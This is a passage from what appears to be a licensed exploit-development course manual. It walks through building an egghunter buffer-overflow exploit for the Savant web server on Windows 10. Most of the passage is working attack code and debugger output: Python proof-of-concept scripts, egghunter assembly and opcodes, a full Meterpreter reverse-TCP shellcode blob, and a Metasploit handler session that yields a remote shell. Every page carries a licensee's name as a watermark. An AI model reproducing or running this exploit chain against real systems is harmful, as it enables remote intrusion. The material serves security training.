  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
  shellcode = b"w00tw00t" + b"\x44" * 400 
 
  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode 
... 
Listing 221 - egghunter_0x0c.py: Using the egghunter to find our secondary buffer 
 
186 (NTAPI Undocumented Functions - NtDisplayString), 
https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.htm
l 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
194 
We attach our debugger to the vulnerable software and set a breakpoint at our POP EAX; RET 
instruction sequence. Once our breakpoint is hit, we will execute until a branch is taken (ph). Right 
before our conditional jump, we want to inspect the destination and confirm that the egghunter 
has been stored in memory without being mangled. 
0:003> ph 
eax=02f0fe70 ebx=014256d0 ecx=00000000 edx=77184550 esi=014256d0 edi=0041703c 
eip=02f0ea88 esp=02f0ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02f0ea88 0f8411000000    je      02f0ea9f                                [br=1] 
 
0:003> u 02f0ea9f L16 
02f0ea9f 90              nop 
02f0eaa0 90              nop 
02f0eaa1 90              nop 
02f0eaa2 90              nop 
02f0eaa3 90              nop 
02f0eaa4 90              nop 
02f0eaa5 6681caff0f      or      dx,0FFFh 
02f0eaaa 42              inc     edx 
02f0eaab 52              push    edx 
02f0eaac 6a02            push    2 
02f0eaae 58              pop     eax 
02f0eaaf cd2e            int     2Eh 
02f0eab1 3c05            cmp     al,5 
02f0eab3 5a              pop     edx 
02f0eab4 74ef            je      02f0eaa5 
02f0eab6 b877303074      mov     eax,74303077h 
02f0eabb 89d7            mov     edi,edx 
02f0eabd af              scas    dword ptr es:[edi] 
02f0eabe 75ea            jne     02f0eaaa 
02f0eac0 af              scas    dword ptr es:[edi] 
02f0eac1 75e7            jne     02f0eaaa 
02f0eac3 ffe7            jmp     edi 
Listing 222 - Verifying that the egghunter is unmangled in memory 
Excellent! According to Listing 222, our egghunter code is present in memory and appears to be 
intact. 
Before letting our egghunter run, we want to double-check that our secondary buffer is in 
memory. Once we confirm this, we’ll set a breakpoint at the last instruction of our egghunter 
(JMP EDI) since that will be executed once our egg has been found. 
0:003> s -a 0x0 L?80000000 w00tw00t 
01425a86  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD 
 
0:003> bp 02f0eac3  
 
0:003> bl 
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674 
     1 e Disable Clear  02f0eac3     0001 (0001)  0:****  
Listing 223 - Confirming our secondary buffer is still present in memory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
195 
With our breakpoint set, we let the debugger continue execution (g). Our expectation is that the 
egg will be found in memory and our breakpoint at the JMP EDI instruction will be triggered; 
however, this does not appear to be the case. 
Our application does not crash and the breakpoint is not hit. Checking the Task Manager, we 
notice that the vulnerable application has 100% CPU usage. 
 
Figure 60: Checking CPU usage 
This suggests that our egghunter is still running but it does not seem to find our secondary 
buffer. We know the buffer is stored in memory as we have manually confirmed this with WinDbg, 
so the problem must be somewhere else. 
While we can find plenty of exploits publicly available that include this egghunter, it appears that 
they are all targeting applications on Windows 7 or prior. This means that some changes 
occurred in between Windows 7 and Windows 10 that break the functionality of our egghunter. 
Let’s try to go through our egghunter code inside WinDbg and determine if we can identify the 
issue. 
6.6.2.1 Exercises 
1. 
Take some time and go through the theory of this section. Make sure you understand the 
purpose of system calls as well as how the arguments are set up. 
2. 
Go through the assembly code of the egghunter and ensure that you understand how it 
works. 
3. 
Generate the egghunter opcodes using the Keystone framework and update your latest 
proof of concept to include the egghunter. 
4. 
Attach WinDbg to the vulnerable software and verify that your egghunter is stored correctly 
in memory. 
5. 
Set a breakpoint at the final instruction of the egghunter and let the debugger resume 
execution. Confirm that your secondary buffer is not found and the vulnerable software has 
a very high CPU utilization. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
196 
6.6.3 Identifying and Addressing the Egghunter Issue 
To understand what causes our egghunter to fail, we’ll execute our proof of concept again and 
attempt to determine which part of our egghunter assembly code does not function properly. 
Given that the egghunter is compact by design, it’s not a very complex piece of code. It shouldn’t 
take long to troubleshoot it. 
The biggest potential point of failure in the code, which is the one we will check first, is the call to 
NtAccessCheckAndAuditAlarm. This is because this code is executed in the background and is 
outside our control. 
Once we reach our conditional jump inside WinDbg, let’s set a breakpoint at the INT 0x2E 
instruction. This will allow us to check that the EAX and EDX registers are set correctly before our 
system call. Then we can step over the system call and inspect the result from EAX. 
0:003> ph 
eax=02fffe70 ebx=014056d0 ecx=00000000 edx=77184550 esi=014056d0 edi=0041703c 
eip=02ffea88 esp=02ffea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02ffea88 0f8411000000    je      02ffea9f                                [br=1] 
 
0:003> u 02ffea9f L16 
02ffea9f 90              nop 
02ffeaa0 90              nop 
02ffeaa1 90              nop 
02ffeaa2 90              nop 
02ffeaa3 90              nop 
02ffeaa4 90              nop 
02ffeaa5 6681caff0f      or      dx,0FFFh 
02ffeaaa 42              inc     edx 
02ffeaab 52              push    edx 
02ffeaac 6a02            push    2 
02ffeaae 58              pop     eax 
02ffeaaf cd2e            int     2Eh 
02ffeab1 3c05            cmp     al,5 
02ffeab3 5a              pop     edx 
02ffeab4 74ef            je      02ffeaa5 
02ffeab6 b877303074      mov     eax,74303077h 
02ffeabb 89d7            mov     edi,edx 
02ffeabd af              scas    dword ptr es:[edi] 
02ffeabe 75ea            jne     02ffeaaa 
02ffeac0 af              scas    dword ptr es:[edi] 
02ffeac1 75e7            jne     02ffeaaa 
02ffeac3 ffe7            jmp     edi 
 
0:003> bp 02ffeaaf  
 
0:003> bl 
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674 
     1 e Disable Clear  02ffeaaf     0001 (0001)  0:****  
Listing 224 - Confirming our secondary buffer is still present in memory 
With our breakpoints set, we let the debugger continue execution and inspect our registers once 
the breakpoints are hit. The first thing we notice is that some addresses appear to return 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
197 
STATUS_ACCESS_VIOLATION in EAX. However, manually inspecting the memory addresses using 
WinDbg shows that they are mapped and we can read the contents of the memory. 
0:003> g 
Breakpoint 1 hit 
eax=00000002 ebx=014056d0 ecx=00000000 edx=77185000 esi=014056d0 edi=0041703c 
eip=02ffeaaf esp=02ffea30 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216 
02ffeaaf cd2e            int     2Eh 
 
0:003> p 
eax=c0000005 ebx=014056d0 ecx=00000000 edx=00000000 esi=014056d0 edi=0041703c 
eip=02ffeab1 esp=02ffea30 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216 
02ffeab1 3c05            cmp     al,5 
 
0:003> dc 77185000  
77185000  80a87074 568a0875 47178808 4e8d55eb  tp..u..V...G.U.N 
77185010  144d3b0a 7d3b5577 333877f8 4e8b66c9  .;M.wU;}.w83.f.N 
77185020  01568d08 8bf45589 9d0c23f1 7718472a  ..V..U...#..*G.w 
77185030  eed3d987 def7d987 ff37748d 7208753b  .........t7.;u.r 
77185040  03c1832a 3b39148d 1f770c55 758ba4f3  *.....9;U.w....u 
77185050  4b10ebf4 0308558b 46e69d14 55897718  ...K.U.....F.w.U 
77185060  83b3ebf8 afe909c6 b8fffffb c0000242  ............B... 
77185070  c78b0ceb 8b08452b 0789187d 5e5fc033  ....+E..}...3._^ 
Listing 225 - Detecting the system call issue 
One of the caveats of hardcoding system call numbers is that they are prone to change across 
different versions of the operating system. Before Windows 8, NtAccessCheckAndAuditAlarm’s 
system call number was always 0x02. Unfortunately, this is no longer the case. In fact, with the 
release of Windows 10, the system call numbers often change with every update. 
We will figure out how to deal with the system call number changes shortly. For now, let’s 
determine if updating the system call number fixes our egghunter. 
To find the updated system call number, we can either search for it online187 or, given that we 
have access to the machine, obtain it directly from within WinDbg. 
0:001> u ntdll!NtAccessCheckAndAuditAlarm 
ntdll!NtAccessCheckAndAuditAlarm: 
76f20ec0 b8c6010000      mov     eax,1C6h 
76f20ec5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (76f20ecd) 
76f20eca c22c00          ret     2Ch 
76f20ecd 8bd4            mov     edx,esp 
76f20ecf 0f34            sysenter 
76f20ed1 c3              ret 
... 
Listing 226 - Obtaining the system call number for NtAccessCheckAndAuditAlarm 
 
187 System call numbers can be compared at the following URL: https://j00ru.vexillium.org/syscalls/nt/32/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
198 
Based on the output from Listing 226, the system call number for our version of Windows is 
0x1C6. Let’s update our Python script with the new system call number and generate our new 
opcodes. 
kali@kali:~$ python3 original_egghunter_win10.py 
egghunter = 
("\x66\x81\xca\xff\x0f\x42\x52\x68\xc6\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8
\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7") 
Listing 227 - Obtaining the opcodes for our egghunter 
According to the opcodes generated in Listing 227, it seems that replacing our PUSH 0x02 
instruction with PUSH 0x1C6 results in null bytes. This is a problem since null bytes are bad 
characters and will prevent us from crashing the application. 
To overcome this, we will take advantage of the NEG188 assembly instruction, which is the 
equivalent of subtracting from 0. We first need to generate a negative value that, when subtracted 
from 0x00, will result in 0x1C6. Let’s examine how we can do this using the evaluate extension of 
WinDbg (?). 
0:001> ? 0x00 - 0x1C6 
Evaluate expression: -454 = fffffe3a 
 
0:001> ? 0x00 - 0xfffffe3a 
Evaluate expression: -4294966842 = ffffffff`000001c6 
Listing 228 - Obtaining the correct value for the NEG operation 
We begin by subtracting the value we want, in this case 0x1C6, from 0x00. This will give us a 
negative hex number (0xfffffe3a). We confirm that the negate operation will produce the desired 
result by replicating it within WinDbg. The result is a QWORD (0xffffffff000001c6), but because we 
are running on the 32-bit architecture, if we run the NEG operation on a register, the result will be 
stored in the lower DWORD of the total value (0x000001c6), allowing us to avoid null bytes. 
Let’s examine what our updated egghunter code looks like now. 
... 
"   loop_check:              " 
        # Save the edx register which holds our memory  
        # address on the stack 
"       push edx            ;" 
        # Push the negative value of the system  
        # call number 
"       mov eax, 0xfffffe3a ;"  
        # Initialize the call to NtAccessCheckAndAuditAlarm 
"       neg eax             ;"  
        # Perform the system call 
"       int 0x2e            ;"  
        # Check for access violation, 0xc0000005  
        # (ACCESS_VIOLATION) 
"       cmp al,05           ;"  
        # Restore the edx register to check  
        # later for our egg 
 
188 (NEG - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_216.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
199 
"       pop edx             ;"  
... 
Listing 229 - original_egghunter_win10_nonull.py Keystone version of the updated egghunter 
With our egghunter code updated, we generate the opcodes and update our proof of concept with 
the new version of our egghunter. 
To determine if our changes fixed the egghunter, we will once again set a breakpoint at our POP 
EAX; RET instruction sequence and step through until our conditional jump. Once there, we will 
set a breakpoint at the last instruction of our egghunter (JMP EDI) and then let the debugger 
resume execution. 
0:003> ph 
eax=02fdfe70 ebx=017356d0 ecx=00000000 edx=77184550 esi=017356d0 edi=0041703c 
eip=02fdea88 esp=02fdea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02fdea88 0f8411000000    je      02fdea9f                                [br=1] 
 
0:003> u 02fdea9f L16 
02fdea9f 90              nop 
02fdeaa0 90              nop 
02fdeaa1 90              nop 
02fdeaa2 90              nop 
02fdeaa3 90              nop 
02fdeaa4 90              nop 
02fdeaa5 6681caff0f      or      dx,0FFFh 
02fdeaaa 42              inc     edx 
02fdeaab 52              push    edx 
02fdeaac b83afeffff      mov     eax,0FFFFFE3Ah 
02fdeab1 f7d8            neg     eax 
02fdeab3 cd2e            int     2Eh 
02fdeab5 3c05            cmp     al,5 
02fdeab7 5a              pop     edx 
02fdeab8 74eb            je      02fdeaa5 
02fdeaba b877303074      mov     eax,74303077h 
02fdeabf 89d7            mov     edi,edx 
02fdeac1 af              scas    dword ptr es:[edi] 
02fdeac2 75e6            jne     02fdeaaa 
02fdeac4 af              scas    dword ptr es:[edi] 
02fdeac5 75e3            jne     02fdeaaa 
02fdeac7 ffe7            jmp     edi 
 
0:003> bp 02fdeac7  
 
0:003> bl 
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674 
     1 e Disable Clear  02fdeac7     0001 (0001)  0:****  
      
0:003> g 
Breakpoint 1 hit 
eax=74303077 ebx=017356d0 ecx=02fdea30 edx=01735a86 esi=017356d0 edi=01735a8e 
eip=02fdeac7 esp=02fdea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02fdeac7 ffe7            jmp     edi {01735a8e} 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
200 
0:003> dc @edi - 0x08 
01735a86  74303077 74303077 44444444 44444444  w00tw00tDDDDDDDD 
01735a96  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
01735aa6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
01735ab6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
01735ac6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
01735ad6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
01735ae6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
01735af6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
Listing 230 - Successfully finding our secondary buffer 
Unlike the last time, where our egghunter ran in an infinite loop, we successfully located our 
secondary buffer as shown in Listing 230. We confirm this by inspecting the memory pointed to 
by the EDI register. 
These kinds of problems appear quite often during exploit development, and it’s not always trivial 
to find a good compromise between portability and shellcode size. Now that we were able to 
overcome this issue, we can proceed to store our shellcode in the secondary buffer and have it 
executed. 
6.6.3.1 Exercises 
1. 
Set breakpoints at key parts in the egghunter code to speed up the analysis of the issue. 
2. 
Obtain the system call number using WinDbg and check it using online resources. Did it 
change often compared to the past versions of Windows? 
3. 
Modify the egghunter to use the new system call number while avoiding null bytes. Can you 
find other instruction sequences, different than the ones used in the section above, that will 
produce the same result? 
4. 
Update your previous proof of concept with the new egghunter opcodes and confirm that 
you can successfully find the secondary buffer. 
6.6.4 Obtaining a Shell 
Now that we have fixed our egghunter and were able to find the secondary buffer, we can work 
towards replacing it with an actual payload. 
Before doing so, we need to remember that our secondary buffer is stored in a different memory 
page allocated by the heap. As such, we do not know if there are any bad characters yet. 
Previously, when modifying the HTTP method, we found that bad characters aren’t necessarily 
universal for the entire application. 
Let’s update our proof of concept with all possible hex characters once again, this time sending 
them as part of our secondary buffer. 
... 
  inputBuffer = b"\x41" * (size - len(egghunter)) 
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
  badchars = ( 
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c" 
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
201 
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26" 
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33" 
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d" 
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a" 
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67" 
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74" 
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81" 
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e" 
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b" 
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8" 
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5" 
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2" 
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf" 
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc" 
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9" 
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6" 
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 
 
  shellcode = b"w00tw00t" + badchars + b"\x44" * (400-len(badchars)) 
 
  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode 
... 
Listing 231 - egghunter_0x0e.py: Checking for bad characters in our secondary buffer 
Let’s place a breakpoint at our POP EAX; RET instruction sequence. Once our breakpoint is hit, 
rather than going through all the instructions and executing our egghunter, we will manually 
search for our egg inside WinDbg. We can then dump the bytes and inspect them to determine if 
any of them are mangled. 
Breakpoint 0 hit 
eax=00000000 ebx=002556d0 ecx=0000000e edx=77184550 esi=002556d0 edi=0041703c 
eip=00418674 esp=02f9ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18674: 
00418674 58              pop     eax 
 
0:003> s -a 0x0 L?80000000 w00tw00t 
00255a86  77 30 30 74 77 30 30 74-00 01 02 03 04 05 06 07  w00tw00t........ 
 
0:003> db 00255a86 L110 
00255a86  77 30 30 74 77 30 30 74-00 01 02 03 04 05 06 07  w00tw00t........ 
00255a96  08 09 0a 0b 0c 0d 0e 0f-10 11 12 13 14 15 16 17  ................ 
00255aa6  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !"#$%&' 
00255ab6  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567 
00255ac6  38 39 3a 3b 3c 3d 3e 3f-40 41 42 43 44 45 46 47  89:;<=>?@ABCDEFG 
00255ad6  48 49 4a 4b 4c 4d 4e 4f-50 51 52 53 54 55 56 57  HIJKLMNOPQRSTUVW 
00255ae6  58 59 5a 5b 5c 5d 5e 5f-60 61 62 63 64 65 66 67  XYZ[\]^_`abcdefg 
00255af6  68 69 6a 6b 6c 6d 6e 6f-70 71 72 73 74 75 76 77  hijklmnopqrstuvw 
00255b06  78 79 7a 7b 7c 7d 7e 7f-80 81 82 83 84 85 86 87  xyz{|}~......... 
00255b16  88 89 8a 8b 8c 8d 8e 8f-90 91 92 93 94 95 96 97  ................ 
00255b26  98 99 9a 9b 9c 9d 9e 9f-a0 a1 a2 a3 a4 a5 a6 a7  ................ 
00255b36  a8 a9 aa ab ac ad ae af-b0 b1 b2 b3 b4 b5 b6 b7  ................ 
00255b46  b8 b9 ba bb bc bd be bf-c0 c1 c2 c3 c4 c5 c6 c7  ................ 
00255b56  c8 c9 ca cb cc cd ce cf-d0 d1 d2 d3 d4 d5 d6 d7  ................ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
202 
00255b66  d8 d9 da db dc dd de df-e0 e1 e2 e3 e4 e5 e6 e7  ................ 
00255b76  e8 e9 ea eb ec ed ee ef-f0 f1 f2 f3 f4 f5 f6 f7  ................ 
00255b86  f8 f9 fa fb fc fd fe ff-44 44 44 44 44 44 44 44  ........DDDDDDDD 
Listing 232 - Checking the bad characters from our secondary buffer in memory 
According to Listing 232, we do not appear to have any bad characters in our secondary buffer. 
Nice! Now we can generate a Meterpreter shell and place it in our secondary buffer without 
having to worry about excluding any characters. Let’s examine the updated proof of concept. 
... 
  inputBuffer = b"\x41" * (size - len(egghunter)) 
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f 
python -v  payload 
  payload  = b"" 
  payload += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64" 
  payload += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28" 
  payload += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c" 
  payload += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52" 
  payload += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1" 
  payload += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49" 
  payload += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01" 
  payload += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75" 
  payload += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b" 
  payload += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24" 
  payload += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a" 
  payload += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77" 
  payload += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff" 
  payload += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29" 
  payload += b"\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x76\x03" 
  payload += b"\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50\x40" 
  payload += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a" 
  payload += b"\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0" 
  payload += b"\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00" 
  payload += b"\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff" 
  payload += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00" 
  payload += b"\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff" 
  payload += b"\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8" 
  payload += b"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40" 
  payload += b"\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5" 
  payload += b"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c" 
  payload += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff" 
  payload += b"\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56" 
  payload += b"\x6a\x00\x53\xff\xd5" 
 
  shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload)) 
 
  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode 
... 
Listing 233 - egghunter_0x0f.py: Getting a shell 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
203 
Before running the proof of concept, we will set up a Metasploit handler to catch our payload. 
Also, this time we will not attach the program to WinDbg. We proceed to run our proof of concept 
code and inspect the Metasploit handler. 
kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD 
windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit" 
... 
[*] Started reverse TCP handler on 192.168.119.120:443  
[*] Sending stage (180291 bytes) to 192.168.120.10 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:49676) 
 
meterpreter > shell 
Process 3088 created. 
Channel 1 created. 
Microsoft Windows [Version 10.0.16299.15] 
(c) 2017 Microsoft Corporation. All rights reserved. 
 
C:\Savant> ipconfig 
ipconfig 
 
Windows IP Configuration 
 
Ethernet adapter Ethernet0: 
 
   Connection-specific DNS Suffix  . :  
   IPv4 Address. . . . . . . . . . . : 192.168.120.10 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0 
   Default Gateway . . . . . . . . . : 192.168.120.254 
Listing 234 - Getting a reverse meterpreter shell from our target machine 
Excellent! We were able to get a reverse Meterpreter shell from our target host. This is much 
better than settling for a limited payload because of space restrictions. 
While getting a reverse shell is a very important milestone in the exploit development process, 
there are still some things we must consider before this exploit becomes portable. 
As we found in this section, the original egghunter code failed because of the hardcoded system 
call number. We gathered the correct system call number for our operating system, and we fixed 
the problem by hardcoding the new number. Because we don’t always know the operating 
system version of our targets beforehand, the portability of our exploit is severely limited. Let’s 
determine if there is anything we can do to improve portability. 
6.6.4.1 Exercises 
1. 
Check for any bad characters in the secondary buffer. Can you explain why the null byte isn’t 
a bad character in this case? 
2. 
Update your previous proof of concept and add a reverse meterpreter payload to it. 
3. 
Set up the Metasploit handler to catch the payload used in your proof of concept. 
4. 
Run the proof of concept and confirm that you can get a reverse meterpreter on the target 
host. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
204 
6.7 Improving the Egghunter Portability Using SEH 
Previously, we observed that the original egghunter code used the NtAccessCheckAndAuditAlarm 
function, because the system call number did not change until Windows 8. We fixed this by 
hardcoding the new system call number but this fix came at the cost of portability. If we stay with 
this approach, we need a way to identify the version of the target operating system beforehand. 
This might be a common step during a penetration test, but we would like to avoid it if possible 
and increase portability of our exploit with other methods. 
The original author of the first egghunter provides an interesting option to overcome the 
portability problem. The point of using NtAccessCheckAndAuditAlarm is for the operating system 
to handle the access violation; however, nothing is stopping us from handling it ourselves. 
Rather than relying on the operating system, we will create and install our own structured 
exception handler to handle accessing invalid memory pages. The reason we’re considering this 
solution to increase the portability of our egghunter is because the underlying SEH mechanism 
has not changed drastically from earlier versions of Windows. 
Of course, the downside is that a larger egghunter requires additional assembly instructions to 
set up the SEH mechanism. The size of this egghunter is roughly 60 bytes, whereas the previous 
one was only 35 bytes. Fortunately, given the space available in our current test case, this is not 
an issue. 
Let’s inspect the original code for this egghunter approach. We have already covered the inner 
workings of the SEH mechanism in a previous module, which should be helpful in understanding 
this method. 
from keystone import * 
 
CODE = ( 
"   start:                                   " 
        # jump to a negative call to dynamically  
        # obtain egghunter position 
"       jmp get_seh_address                 ;"  
"   build_exception_record:                  " 
        # pop the address of the exception_handler  
        # into ecx 
"       pop ecx                             ;"  
        # mov signature into eax 
"       mov eax, 0x74303077                 ;"  
        # push Handler of the  
        # _EXCEPTION_REGISTRATION_RECORD structure 
"       push ecx                            ;"  
        # push Next of the  
        # _EXCEPTION_REGISTRATION_RECORD structure 
"       push 0xffffffff                     ;"  
        # null out ebx 
"       xor ebx, ebx                        ;"  
        # overwrite ExceptionList in the TEB with a pointer 
        # to our new _EXCEPTION_REGISTRATION_RECORD structure 
"       mov dword ptr fs:[ebx], esp         ;"  
"   is_egg:                                  " 
        # push 0x02 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
205 
"       push 0x02                           ;"  
        # pop the value into ecx which will act  
        # as a counter 
"       pop ecx                             ;"  
        # mov memory address into edi 
"       mov edi, ebx                        ;"  
        # check for our signature, if the page is invalid we  
        # trigger an exception and jump to our exception_handler function 
"       repe scasd                          ;"  
        # if we didn't find signature, increase ebx  
        # and repeat 
"       jnz loop_inc_one                    ;"   
        # we found our signature and will jump to it 
"       jmp edi                             ;"  
"   loop_inc_page:                           "  
        # if page is invalid the exception_handler will  
        # update eip to point here and we move to next page 
"       or bx, 0xfff                        ;"  
"   loop_inc_one:                            " 
        # increase ebx by one byte 
"       inc ebx                             ;"  
